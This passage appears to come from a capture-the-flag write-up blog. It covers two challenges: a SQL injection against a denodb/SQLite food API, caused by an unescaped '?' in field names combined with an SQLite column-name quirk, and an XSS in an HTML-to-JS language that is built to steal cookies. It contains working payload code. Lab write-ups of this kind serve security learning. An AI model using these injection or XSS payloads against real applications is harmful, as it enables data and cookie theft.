        <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> Food<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'name'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">where</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        ctx<span class="token punctuation">.</span>response<span class="token punctuation">.</span>body <span class="token operator">=</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        ctx<span class="token punctuation">.</span>response<span class="token punctuation">.</span>body <span class="token operator">=</span> e<span class="token punctuation">.</span>name
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>id</code> will be an object, and you have complete control over it, but it does not support arrays and nested objects, and only simple objects can be passed in.</p>
<p>The goal is SQL injection.</p>
<p>This is the longest and most serious problem I have ever seen. I directly opened the Chrome debugger to trace the code. The following briefly explains the internal operation.</p>
<p>First, the object you passed in will be converted into the following form:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">wheres</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span><span class="token literal-property property">field</span><span class="token operator">:</span> <span class="token string">"any"</span><span class="token punctuation">,</span> <span class="token literal-property property">opeator</span><span class="token operator">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span><span class="token literal-property property">field</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token literal-property property">opeator</span><span class="token operator">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"hello"</span><span class="token punctuation">&#125;</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Then, it is passed to <a target="_blank" rel="noopener" href="https://github.com/eveningkid/denodb/blob/v1.0.40/lib/connectors/sqlite3-connector.ts#L55">this._translator.translateToQuery</a> to generate a well-formed SQL query. Then, using a mysterious string segmentation to see if there is a subquery, it is thrown into SQLite. Part of the code is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">query</span><span class="token punctuation">(</span>queryDescription<span class="token operator">:</span> QueryDescription<span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>any <span class="token operator">|</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_makeConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> query <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_translator<span class="token punctuation">.</span><span class="token function">translateToQuery</span><span class="token punctuation">(</span>queryDescription<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> subqueries <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">;(?=(?:[^'"]|'[^']*'|"[^"]*")*$)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> results <span class="token operator">=</span> subqueries<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">subquery<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> preparedQuery <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_client<span class="token punctuation">.</span><span class="token function">prepareQuery</span><span class="token punctuation">(</span>subquery <span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The place where the string is segmented has caused problems before, and even if it is changed, problems will still occur, but it seems irrelevant in this problem: <a target="_blank" rel="noopener" href="https://github.com/eveningkid/denodb/pull/241">https://github.com/eveningkid/denodb/pull/241</a></p>
<p>The query generated here is already a complete SQL query, which means that the parameter binding is not done by throwing it into SQLite, but directly using JS.</p>
<p>So how is this complete SQL query generated?</p>
<p>First, your stuff will be thrown into the query builder, and something like this will be executed:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">queryBuilder <span class="token operator">=</span> queryBuilder<span class="token punctuation">.</span><span class="token function">where</span><span class="token punctuation">(</span>
  where<span class="token punctuation">.</span>field<span class="token punctuation">,</span>
  where<span class="token punctuation">.</span>operator<span class="token punctuation">,</span>
  where<span class="token punctuation">.</span>value<span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 回傳 queryBuilder.toString</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In the <code>queryBuilder.where</code>, it basically does things based on what you passed in. For example, if I pass: <code>&#123;field:&quot;id&quot;, operator:&quot;=&quot;, value:&quot;hello&quot;&#125;</code>, it will eventually execute:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>_statements<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">grouping</span><span class="token operator">:</span> <span class="token string">'where'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'whereBasic'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">column</span><span class="token operator">:</span> <span class="token string">"id"</span><span class="token punctuation">,</span>
    <span class="token literal-property property">operator</span><span class="token operator">:</span> <span class="token string">"="</span><span class="token punctuation">,</span>
    <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span>
    <span class="token literal-property property">not</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_not</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">bool</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_bool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">asColumn</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>So the final conversion to a string is based on this <code>this._statements</code>.</p>
<p>First, it will generate a statement based on your where. How to generate it? Wrap the column in backticks and change the value to <code>?</code>, like this:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>food<span class="token punctuation">`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span>? <span class="token operator">and</span> <span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span><span class="token operator">=</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The so-called “wrap” code is at: <a target="_blank" rel="noopener" href="https://github.com/aghussb/dex/blob/1.0.2/lib/formatter.js#L274">https://github.com/aghussb/dex/blob/1.0.2/lib/formatter.js#L274</a></p>
<p>After generating the SQL query, data binding begins, and the code is roughly like this: <a target="_blank" rel="noopener" href="https://github.com/knex/knex/blob/2.3.0/lib/execution/internal/query-executioner.js#L6">https://github.com/knex/knex/blob/2.3.0/lib/execution/internal/query-executioner.js#L6</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">formatQuery</span><span class="token punctuation">(</span><span class="token parameter">sql<span class="token punctuation">,</span> bindings<span class="token punctuation">,</span> timeZone<span class="token punctuation">,</span> client</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  bindings <span class="token operator">=</span> bindings <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>bindings<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\?\?</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>match <span class="token operator">===</span> <span class="token string">'\\?'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">'?'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">===</span> bindings<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> match<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">const</span> value <span class="token operator">=</span> bindings<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> client<span class="token punctuation">.</span><span class="token function">_escapeBinding</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> timeZone <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Replace <code>?</code> with a string, then escape it first, which means adding single quotes outside, and then replacing the single quotes in the string with two single quotes.</p>
<p>It seems fine, but the <code>?</code> in the field name of deno’s lib is forgotten to be escaped, so if you pass: <code>&#123;&quot;id&quot;:&quot;1&quot;, &quot;?&quot;: &quot;A&quot;&#125;</code>, the resulting SQL will be:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>food<span class="token punctuation">`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span>? <span class="token operator">and</span> <span class="token identifier"><span class="token punctuation">`</span>?<span class="token punctuation">`</span></span><span class="token operator">=</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>And after binding, it will become:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>food<span class="token punctuation">`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token identifier"><span class="token punctuation">`</span>'A'<span class="token punctuation">`</span></span><span class="token operator">=</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>You will find that SQL injection can be done on the A side, just close the backtick first.</p>
<p>But the problem is that this will produce an illegal field name, because there must be a single quote inside, like this:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>food<span class="token punctuation">`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token identifier"><span class="token punctuation">`</span>'name<span class="token punctuation">`</span></span><span class="token comment">--'=?</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>It will result in:</p>
<blockquote>
<p>Error: no such column: ‘name</p>
</blockquote>
<p>I got stuck here at the beginning, there are probably two ways:</p>
<ol>
<li>There are other vulnerabilities that have not been noticed.</li>
<li>There is a magical SQLite syntax that can bypass non-existent field names.</li>
</ol>
<p>The answer is the latter.</p>
<p>Neither of the following two will go wrong:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id <span class="token keyword">from</span> food <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>not_exist'<span class="token punctuation">`</span></span> <span class="token operator">and</span> <span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> food <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>not_exist'<span class="token punctuation">`</span></span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Don’t ask me why, I don’t know either, it feels like some kind of syntax bug (or feature XD).</p>
<p>After getting the SQL injection, just make a time-based query, and then use xsleak to test the time. Or you can make it error-based like terjanq, which is more efficient.</p>
<p>Other people’s writeups:</p>
<ol>
<li>parrot <a target="_blank" rel="noopener" href="https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98">https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98</a></li>
<li>terjanq <a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436">https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436</a></li>
<li>kunte_ <a target="_blank" rel="noopener" href="https://files.veryhax.ninja/solve-foodapi-hacklu22.html">https://files.veryhax.ninja/solve-foodapi-hacklu22.html</a></li>
</ol>
<h2><span id="htpl3-solves">HTPL(3 solves)</span></h2><p>This is a self-made AST that uses HTML to combine JS, for example:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>will be translated into <code>&quot;hello&quot;</code>.</p>
<p>The goal is to steal cookies, so you need to be able to execute XSS. I looked at this problem for a long time but didn’t have any ideas. I thought that some mathematical operations could be used to escape strings, but I didn’t find <code>\</code>, and I didn’t see <code>*</code> that could be used for comments.</p>
<p>After the game, I found that the idea was close, but I forgot that the HTML comment <code>&lt;!--</code> can also be used. Using less than + not + subtraction can combine to form the comment symbol, like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-program</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-program</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>will be translated into:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">"a"</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$1$<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The final semicolon will be removed, so it can be combined with the <code>[]</code> in the next line to become an attribute access, like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-program</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
            
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>asd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>        
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-array</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>toString<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-array</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-program</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>will be translated into:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">write</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">alert</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">prompt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> $a$<span class="token operator">=</span><span class="token string">"x"</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$asd$<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token string">"toString"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>which is <code>const $a$=&quot;x&quot;[&quot;toString&quot;]</code></p>
<p>It’s easy once you get here, just continue to get the function constructor and then call it, like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-program</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
            
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>asd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>        
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-array</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>toString<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-array</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>b<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>asd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>        
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-array</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>constructor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-array</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-call</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>b<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>alert("xss")<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-call</span><span class="token punctuation">></span></span>      
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-call</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-call</span><span class="token punctuation">></span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-program</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>will become:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">write</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">alert</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">prompt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> $a$<span class="token operator">=</span><span class="token string">"x"</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$asd$<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token string">"toString"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> $b$<span class="token operator">=</span>$a$<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$asd$<span class="token punctuation">;</span>
